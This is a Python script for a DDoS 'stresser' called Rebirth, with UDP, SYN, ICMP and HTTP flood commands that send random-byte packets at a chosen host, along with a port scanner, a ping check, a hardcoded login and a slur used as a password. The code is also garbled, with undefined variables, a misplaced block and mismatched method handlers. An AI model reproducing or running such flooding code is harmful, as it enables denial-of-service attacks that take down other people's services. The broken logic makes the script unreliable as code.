#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;R E B I R T H |Kaz| D E M O N S\x07")
def modifications():
	print ("Contact Misfortune or Reaper the script is currently under maitnance")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
method = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mDDoS METHODS\033[91m                     ║               
║══════════════════════════════════════════════════════║
║ \033[00mTCPKill  ~HOST~ <PORT> ~Seconds~ ~SIZE~  \033[91m|\033[00m TCPKill ATTACK\033[91m    ║
║ \033[00mOvhDown ~HOST~ <PORT> ~Seconds~ ~SIZE~  \033[91m|\033[00m OvhDown ATTACK\033[91m   ║
║ \033[00mNFOKill  ~HOST~ <PORT> ~Seconds~ ~SIZE~  \033[91m|\033[00m NFOKill ATTACK\033[91m    ║
║ \033[00mHomeslap ~HOST~ <PORT> ~Seconds~ ~SIZE~ \033[91m|\033[00m Homeslap ATTACK\033[91m   ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

info = """
[\033[91mSIN\033[00m] \033[91mMade By Rebirth,
Most/Everything im available 
Bigest attack: 26.3 gbps
"""

version = "3.2"

"""
statz = """

║              \033[00mSTATS\033[91m                     ║

\033[00m- Attacks: \033[91m{}                                                                       
╚══════════════════════════════════════════════════════╝\033[00m"""
banner = """\033[1;00m
 
┏┓╋╋╋┏┓╋┏┓┏━┓╋┏┓┏━━━┓┏━━━┓
┃┃╋╋╋┃┃╋┃┃┃┃┗┓┃┃┃┏━┓┃┃┏━┓┃
┃┃╋╋╋┃┃╋┃┃┃┏┓┗┛┃┃┃╋┃┃┃┗━┛┃
┃┃╋┏┓┃┃╋┃┃┃┃┗┓┃┃┃┗━┛┃┃┏┓┏┛
┃┗━┛┃┃┗━┛┃┃┃╋┃┃┃┃┏━┓┃┃┃┃┗┓
┗━━━┛┗━━━┛┗┛╋┗━┛┗┛╋┗┛┗┛┗━┛
                       
"""

altbanner = """ 
			      Rebirth Is The Way To
		      Heaven And people are punished put in hell
		      		  ~K A Z S T R E S S~
"""

cookie = open(".rebirth_cookie","w+") 
                                           
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
OvhKill = True
NfoDown = True
HomeSlap = True
TCPKill = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < Seconds and OvhDown and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < Seconds and OvhDown and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < Seconds and TCPKill and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < Seconds and Homeslap and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;R E B I R T H\x07")
		sin = input("\033[1;00m[\033[91mREBIRTH\033[1;00m]-\033[91m家\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "version":
			print ("sinful version: "+version+" ")
		elif sinput == "stats":
			print ("\033[00m- Attacks: \033[91m{}                                        ".format (tattacks))
		elif sinput == "methods":
			print (method)
			main()
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[91mSIN\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n[\033[91mSIN\033[00m] TCPKill Running processes: {}".format (uaid))
			print ("[\033[91mSIN\033[00m] OvhDown Running processes: {}".format (iaid))
			print ("[\033[91mSIN\033[00m] NFOKill Running processes: {}".format (said))
			print ("[\033[91mSIN\033[00m] Total attacks running: {}\n".format (aid))
			main()
			sfound = 0
			sys.stdout.write("\x1b]2;S T R E S S E R |{}| F O U N D\x07".format (sfound))
			try:
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mSIN\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;S I N F U L L |{}ms| D E M O N S\x07".format (stop))
						print ("Sinfull: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;S T R E S S E R |TIME OUT| D E M O N S\x07")
						print ("STRESS: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[91mSIN\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "icmp":
			if username == "guests":
				print ("[\033[91mSIN\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mSIN\033[00m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mSIN\033[00m] Host: {} invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mSIN\033[00m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[91mSIN\033[00m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\033[91mSIN\033[00m] {} Not a command".format(sinput))
			main()



try:
	users = ["Skid", "Hit"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username (Skid): ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, exiting")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["root", "gayman"]
	password = getpass.getpass ("[+] Password (root): ")
	if user == "root":
		if password == passwords[0]:
			print ("[+] Login correct")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()